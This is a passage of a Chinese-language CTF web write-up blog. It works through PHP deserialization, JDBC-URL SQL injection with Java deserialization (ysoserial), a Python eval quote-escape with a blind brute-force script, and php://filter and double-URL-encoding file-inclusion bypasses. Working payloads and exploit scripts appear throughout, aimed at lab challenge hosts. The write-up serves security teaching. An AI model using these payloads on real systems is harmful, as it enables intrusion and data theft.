class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>= <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span> ;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span> ;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span> = <span class="string">&quot;n\l /flag&quot;</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file= <span class="keyword">new</span> Open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">print</span> (base64_encode(serialize(<span class="variable">$a</span>)));</span><br><span class="line"><span class="comment">//@unserialize(base64_decode($_POST[&#x27;unser&#x27;]));</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tz<span class="meta">o0</span>OiJHYW<span class="number">1</span>lIj<span class="meta">o2</span>O<span class="symbol">ntzOjg6</span>I<span class="symbol">nVzZXJuYW1</span>lIjtzOjU<span class="number">6</span>ImFkbWluIjtzOj<span class="name">g6</span>I<span class="symbol">nBhc3</span><span class="symbol">N3</span>b<span class="number">3</span>JkIjtzOjU<span class="number">6</span>ImFkbWluIjtzOj<span class="name">g6</span>I<span class="symbol">nJlZ2</span>lzdGVyIjtzOjU<span class="number">6</span>ImFkbWluIjtzOjQ<span class="number">6</span>ImZpbGUi<span class="meta">O086</span><span class="symbol">NDoiT3</span>BlbiI<span class="number">6</span>MDp<span class="number">7</span>fX<span class="name">M6</span>ODoiZmlsZW<span class="number">5</span>hbWUi<span class="meta">O047</span>cz<span class="meta">o3</span>OiJjb<span class="number">250</span>ZW<span class="number">50</span>IjtzOjk<span class="number">6</span>I<span class="name">m5</span>cbCAvZmxhZyI<span class="number">7</span>fQ==</span><br></pre></td></tr></table></figure>


<h2 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2><p>下载下来class文件，jd-gui反编译</p>
<p><img src="https://img.npfs06.top/20210324222013.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><code>/common/test</code>和<code>/sqlDct</code>这两个路由都是可以直接访问的</p>
<p>我们跟进到<code>sqlDict</code>路由的<code>getTableData</code>函数</p>
<p><img src="https://img.npfs06.top/20210324222340.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>根据dbName传入值。然后创建数据库连接。并且带入sql执行。很明显，<code>dbName</code>可控，存在sql注入</p>
<p>jdbc类似URL解析。所以当我们输入<code>myapp#&#39; union select 1#</code>时<br><code>#</code>在URL中是锚点，没有实际意义</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://mysqldbserver:3306/myapp#&#x27; union <span class="keyword">select</span> <span class="number">1</span>#</span><br><span class="line">会被解析成</span><br><span class="line">jdbc:mysql://mysqldbserver:<span class="number">3306</span>/myapp</span><br><span class="line"></span><br><span class="line">再带入sql语句</span><br><span class="line"><span class="keyword">Select</span> TABLE_COMMENT <span class="keyword">from</span> INFORMATION_SCHEMA.TABLES <span class="keyword">Where</span> table_schema = <span class="string">&#x27;#&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>#<span class="string">&#x27; and table_name=&#x27;</span><span class="string">&quot; + TableName + &quot;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">第一个#被单引号包裹。成了普通的#字符。第二个#注释掉了后面的语句。造成sql注入</span></span><br></pre></td></tr></table></figure>
<p>所以我们可以这样构造</p>
<p><img src="https://img.npfs06.top/20210324223039.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>得到password</p>
<p>通过信息收集我们发现了这么个东西：</p>
<p><img src="https://img.npfs06.top/20210324223213.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>百度搜索一波，发现spring boot存在这么个页面：<code>swagger-ui.html</code>我们访问下，有三个路由</p>
<p><img src="https://img.npfs06.top/20210324224141.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>在/common/user/login接口，用我们刚刚得到的账号密码登入，得到一串token</p>
<blockquote>
<p>下方的特征可以作为序列化的标志参考:</p>
<p>一段数据以<strong>rO0AB</strong>开头，你基本可以确定这串就是JAVA序列化base64加密的数据。</p>
<p>或者如果以<strong>aced</strong>开头，那么他就是这一段java序列化的16进制。</p>
</blockquote>
<p>明显为java反序列化</p>
<p><img src="https://img.npfs06.top/20210324224333.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>我们可以用工具SerializationDumper来解析数据</p>
<p>用法:</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span>SerializationDumper-[*version*].<span class="keyword">jar </span>[*<span class="number">16</span>进制数据*)]</span><br></pre></td></tr></table></figure>
<p>这里不详细写了，重点是找到反序列话注入点</p>
<p>尝试把序列化的token字段作为Authorization去印证这个UI的/common/user/current接口。显示成功登录。</p>
<p><img src="https://img.npfs06.top/20210324224910.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>直接用yso生成payload</p>
<p><img src="https://img.npfs06.top/20210324221829.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210324225143.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>监听端口，把生成文件里的token替换掉原token，即可得到flag</p>
<h2 id="PyCalX-1-amp-2"><a href="#PyCalX-1-amp-2" class="headerlink" title="PyCalX 1&amp;2"></a>PyCalX 1&amp;2</h2><p>就是个计算器</p>
<p><img src="https://img.npfs06.top/20210324235635.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>直接给了源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> cgi;</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> html <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">FLAG = <span class="built_in">open</span>(<span class="string">&#x27;/var/www/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">OK_200 =  </span><br><span class="line"></span><br><span class="line">print(OK_200)</span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;source&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line">    source = arguments[<span class="string">&#x27;source&#x27;</span>].value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    source = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> source == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>+escape(<span class="built_in">str</span>(<span class="built_in">open</span>(__file__,<span class="string">&#x27;r&#x27;</span>).read()))+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;value1&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;value2&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;op&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_value</span>(<span class="params">val</span>):</span></span><br><span class="line">        val = <span class="built_in">str</span>(val)[:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(val).isdigit(): <span class="keyword">return</span> <span class="built_in">int</span>(val)</span><br><span class="line">        blacklist = [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>] <span class="comment"># I don&#x27;t like tuple, list and dict.</span></span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">            print(<span class="string">&#x27;&lt;center&gt;Invalid value&lt;/center&gt;&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_op</span>(<span class="params">val</span>):</span></span><br><span class="line">        val = <span class="built_in">str</span>(val)[:<span class="number">2</span>]</span><br><span class="line">        list_ops = [<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">            print(<span class="string">&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    op = get_op(arguments[<span class="string">&#x27;op&#x27;</span>].value)</span><br><span class="line">    value1 = get_value(arguments[<span class="string">&#x27;value1&#x27;</span>].value)</span><br><span class="line">    value2 = get_value(arguments[<span class="string">&#x27;value2&#x27;</span>].value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(value1).isdigit() ^ <span class="built_in">str</span>(value2).isdigit():</span><br><span class="line">        print(<span class="string">&#x27;&lt;center&gt;Types of the values don\&#x27;t match&lt;/center&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    calc_eval = <span class="built_in">str</span>(<span class="built_in">repr</span>(value1)) + <span class="built_in">str</span>(op) + <span class="built_in">str</span>(<span class="built_in">repr</span>(value2))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;&gt;&gt;&gt;&gt; print(&#x27;</span>+escape(calc_eval)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">str</span>(<span class="built_in">eval</span>(calc_eval))</span><br><span class="line">        <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">&#x27;True&#x27;</span> <span class="keyword">or</span> result == <span class="string">&#x27;False&#x27;</span>:</span><br><span class="line">            print(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;Invalid&quot;</span>) <span class="comment"># Sorry we don&#x27;t support output as a string due to security issue.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>value1+op+value2<br>value1和2不能出现<code>&quot;()[]\</code><br>op的第一个字符只能是<code>+-/*=!</code></p>
<p>最后是通过<code>calc_eval = str(repr(value1)) + str(op) + str(repr(value2))</code>拼接</p>
<p>而repr() 函数是将对象转化为供解释器读取的，看下面的例子</p>
<p><img src="https://img.npfs06.top/20210325000340.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p> repr在转化字符串时会默认套上单引号，而由于op是没过滤单引号，所以可以导致val2逃逸 </p>
<p>最初的执行是这样的</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1&#x27;  +  &#x27;1&#x27;</span><br></pre></td></tr></table></figure>
<p>但由于op只判断第一个值。我们可以插入单引号。并且注释后面的单引号</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;1&#x27;</span>  +<span class="string">&#x27;  &#x27;</span> and <span class="built_in">source</span> <span class="keyword">in</span> flag<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>可以看到。我们op输入+’。成功闭合语句。然后在value2的地方构造语句并注释，返回类型为True或False，构造布尔盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.printable</span><br><span class="line">flag=<span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">url=<span class="string">&#x27;http://0a1bd9a5-ef79-49d0-8cda-cd4d937ff543.node3.buuoj.cn/cgi-bin/pycalx.py&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;value1&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;op&#x27;</span>: <span class="string">&#x27;+\&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;value2&#x27;</span>: <span class="string">&#x27;and 1 and source in FLAG#&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;source&#x27;</span>: flag+i</span><br><span class="line">        &#125;</span><br><span class="line">        re = requests.get(url, params=data)</span><br><span class="line">        <span class="comment">#print(re.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;True&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag+=i</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>




<h2 id="WMCTF2020-Make-PHP-Great-Again-2-0"><a href="#WMCTF2020-Make-PHP-Great-Again-2-0" class="headerlink" title="[WMCTF2020]Make PHP Great Again 2.0"></a>[WMCTF2020]Make PHP Great Again 2.0</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload1:</p>
<p><a href="http://npfs06.top/2020/10/10/%E5%88%A9%E7%94%A8PHP-SESSION-UPLOAD-PROGRESS%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a></p>
<p>payload2:</p>
<p><code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/var/</span>www<span class="regexp">/html/</span>flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>原理可参考<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a></p>
<h2 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">@chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">var_dump(<span class="string">&quot;Sandbox:&quot;</span>.<span class="variable">$sandbox</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$content</span>))</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="variable">$content</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>方法一：两次urldecode编码绕过</p>
<p>通过查看伪协议处理的源码👇</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="keyword">void</span> php_stream_apply_filter_list(php_stream *stream, char *filterlist, <span class="keyword">int</span> read_chain, <span class="keyword">int</span> write_chain) <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">&#123;</span><br><span class="line">	char *p, *token = <span class="literal">NULL</span>;</span><br><span class="line">	php_stream_filter *temp_filter;</span><br><span class="line"></span><br><span class="line">	p = php_strtok_r(filterlist, <span class="string">&quot;|&quot;</span>, &amp;token);</span><br><span class="line">	<span class="keyword">while</span> (p) &#123;</span><br><span class="line">		php_url_decode(p, strlen(p));<span class="comment">#👈对过滤器进行了一次urldecode</span></span><br><span class="line">		<span class="keyword">if</span> (read_chain) &#123;</span><br><span class="line">			<span class="keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;</span><br><span class="line">				php_stream_filter_append(&amp;stream-&gt;readfilters, temp_filter);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;Unable to create filter (%s)&quot;</span>, p);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (write_chain) &#123;</span><br><span class="line">			<span class="keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;</span><br><span class="line">				php_stream_filter_append(&amp;stream-&gt;writefilters, temp_filter);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				php_error_docref(<span class="literal">NULL</span>, E_WARNING, <span class="string">&quot;Unable to create filter (%s)&quot;</span>, p);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		p = php_strtok_r(<span class="literal">NULL</span>, <span class="string">&quot;|&quot;</span>, &amp;token);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>file_put_contents中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的 ，题目过滤了%25 ，很好绕过</p>
<p><img src="https://img.npfs06.top/20210326161153.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$char</span> = <span class="string">&#x27;r&#x27;</span>; <span class="comment">#构造r的二次编码</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ascii1</span> = <span class="number">0</span>; <span class="variable">$ascii1</span> &lt; <span class="number">256</span>; <span class="variable">$ascii1</span>++) &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$ascii2</span> = <span class="number">0</span>; <span class="variable">$ascii2</span> &lt; <span class="number">256</span>; <span class="variable">$ascii2</span>++) &#123;</span><br><span class="line">		<span class="variable">$aaa</span> = <span class="string">&#x27;%&#x27;</span>.<span class="variable">$ascii1</span>.<span class="string">&#x27;%&#x27;</span>.<span class="variable">$ascii2</span>;</span><br><span class="line">		<span class="keyword">if</span>(urldecode(urldecode(<span class="variable">$aaa</span>)) == <span class="variable">$char</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$char</span>.<span class="string">&#x27;: &#x27;</span>.<span class="variable">$aaa</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>payload:</p>
